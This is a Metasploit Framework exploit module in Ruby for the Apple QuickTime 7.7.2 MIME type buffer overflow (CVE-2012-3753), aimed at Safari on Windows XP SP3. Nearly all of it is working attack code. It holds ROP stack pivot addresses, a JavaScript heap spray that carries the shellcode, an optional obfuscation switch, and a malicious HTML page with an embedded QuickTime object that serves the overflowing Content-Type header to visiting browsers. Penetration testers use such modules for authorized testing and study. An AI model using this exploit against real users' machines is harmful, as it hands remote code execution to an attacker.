##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Egghunter
	include Msf::Exploit::RopDb

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:os_name    => OperatingSystems::WINDOWS,
		:ua_name    => HttpClients::SAFARI,
		:ua_maxver  => '5.0.1',
		:ua_maxver  => '5.1.7',
		:javascript => true,
		:rank       => NormalRanking, # reliable memory corruption
		:vuln_test  => nil
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apple QuickTime 7.7.2 MIME Type Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Apple QuickTime 7.7.2. The stack
				based overflow occurs when processing a malformed Content-Type header. The module
				has been tested successfully on Safari 5.1.7 and 5.0.7 on Windows XP SP3.
			},
			'Author'         =>
				[
					'Pavel Polischouk', # Vulnerability discovery
					'juan vazquez' # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2012-3753' ],
					[ 'OSVDB', '87088'],
					[ 'BID', '56438' ],
					[ 'URL', 'http://support.apple.com/kb/HT5581' ],
					[ 'URL', 'http://asintsov.blogspot.com.es/2012/11/heapspray.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					# Tested with QuickTime 7.7.2
					[ 'Automatic', {} ],
					[ 'Windows XP SP3 / Safari 5.1.7 / Apple QuickTime Player 7.7.2',
						{
							'OffsetFirstStackPivot' => 389,
							'OffsetSecondStackPivot' => 105,
							'FirstStackPivot' => 0x671a230b, # ADD ESP,4B8 # RETN # Quicktime.qts,
							'SecondStackPivot' => 0x67123437, # pop esp / ret # Quicktime.qts
							'SprayOffset' => 264,
							'SprayedAddress' => 0x60130124
						}
					],
					[ 'Windows XP SP3 / Safari 5.0.5 / Apple QuickTime Player 7.7.2',
						{
							'OffsetFirstStackPivot' => 389,
							'OffsetSecondStackPivot' => 105,
							'FirstStackPivot' => 0x671a230b, # ADD ESP,4B8 # RETN # Quicktime.qts,
							'SecondStackPivot' => 0x67123437, # pop esp / ret # Quicktime.qts
							'SprayOffset' => 264,
							'SprayedAddress' => 0x60130124
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Nov 07 2012',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class
		)
	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''

		browser_name = ""
		if agent =~ /Safari/ and agent=~ /Version\/5\.1\.7/
			browser_name = "Safari 5.1.7"
		elsif agent =~ /Safari/ and agent=~ /Version\/5\.0\.5/
			browser_name = "Safari 5.0.5"
		end

		os_name = 'Windows XP SP3'

		targets.each do |t|
			if (!browser_name.empty? and t.name.include?(browser_name)) and (!nt.empty? and t.name.include?(os_name))
				print_status("Target selected as: #{t.name}")
				return t
			end
		end

		return nil
	end

	def on_request_uri(client, request)

		agent = request.headers['User-Agent']
		my_target = get_target(agent)

		# Avoid the attack if the victim doesn't have the same setup we're targeting
		if my_target.nil?
			print_error("Browser not supported: #{agent}")
			send_not_found(cli)
			return
		end

		return if ((p = regenerate_payload(client)) == nil)

		if request.uri =~ /\.smil$/
			print_status("Sending exploit (target: #{my_target.name})")
			smil = rand_text_alpha(20)
			type = rand_text_alpha_lower(1)
			subtype = rand_text_alpha_lower(my_target['OffsetSecondStackPivot'])
			subtype << [my_target['SecondStackPivot']].pack("V")
			subtype << [my_target['SprayedAddress']].pack("V")
			subtype << rand_text_alpha_lower(my_target['OffsetFirstStackPivot'] - subtype.length)
			subtype << rand_text_alpha_lower(4)
			subtype << [my_target['FirstStackPivot']].pack("V")
			subtype << rand_text_alpha_lower(10000 - subtype.length)
			send_response(client, smil, { 'Content-Type' => "#{type}/#{subtype}" })
		else
			print_status("Sending initial HTML")
			url =  ((datastore['SSL']) ? "https://" : "http://")
			url << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(client.peerhost) : datastore['SRVHOST'])
			url << ":" + datastore['SRVPORT'].to_s
			url << get_resource
			fname = rand_text_alphanumeric(4)

			code = generate_rop_payload('msvcrt', payload.encoded, {'target'=>'xp'})
			js_code = Rex::Text.to_unescape(code, Rex::Arch.endian(my_target.arch))
			offset = rand_text(my_target['SprayOffset'])
			js_offset = Rex::Text.to_unescape(offset, Rex::Arch.endian(my_target.arch))
			fill = rand_text(4)
			js_fill = Rex::Text.to_unescape(fill, Rex::Arch.endian(my_target.arch))

			# Heap Spray based on http://asintsov.blogspot.com.es/2012/11/heapspray.html
			js = <<-JSSPRAY
function heapSpray(offset, shellcode, fillsled) {
	var chunk_size, headersize, fillsled_len, code;
	var i, codewithnum;
	chunk_size = 0x40000;
	headersize = 0x10;
	fillsled_len = chunk_size - (headersize + offset.length + shellcode.length);
	while (fillsled.length <fillsled_len)
		fillsled += fillsled;
	fillsled = fillsled.substring(0, fillsled_len);
	code = offset + shellcode + fillsled;
	heap_chunks = new Array();
	for (i = 0; i<1000; i++)
	{
		codewithnum = "HERE" + code;
		heap_chunks[i] = codewithnum.substring(0, codewithnum.length);
	}
}
var myoffset = unescape("#{js_offset}");
var myshellcode = unescape("#{js_code}");
var myfillsled = unescape("#{js_fill}");
heapSpray(myoffset,myshellcode,myfillsled);
			JSSPRAY

			if datastore['OBFUSCATE']
				js = ::Rex::Exploitation::JSObfu.new(js)
				js.obfuscate
			end

			content =  "<html>"
			content << "<head><script>"
			content << "#{js}"
			content << "</script></head>"
			content << "<body>"
			content << <<-ENDEMBED
<OBJECT
CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"
WIDTH="1"
HEIGHT="1"
CODEBASE="http://www.apple.com/qtactivex/qtplugin.cab">
<PARAM name="SRC"        VALUE = "#{url}/#{fname}.smil">
<PARAM name="QTSRC"      VALUE = "#{url}/#{fname}.smil">
<PARAM name="AUTOPLAY"   VALUE = "true"               >
<PARAM name="TYPE"       VALUE = "video/quicktime"    >
<PARAM name="TARGET"     VALUE = "myself"             >
<EMBED
	SRC        = "#{url}/#{fname}.smil"
	QTSRC      = "#{url}/#{fname}.smil"
	TARGET     = "myself"
	WIDTH      = "1"
	HEIGHT     = "1"
	AUTOPLAY   = "true"
	PLUGIN     = "quicktimeplugin"
	TYPE       = "video/quicktime"
	CACHE      = "false"
	PLUGINSPAGE= "http://www.apple.com/quicktime/download/" >
</EMBED>
</OBJECT>
			ENDEMBED
			content << "</body></html>"
			send_response(client, content, { 'Content-Type' => "text/html" })
		end

		# Handle the payload
		handler(client)
	end

end
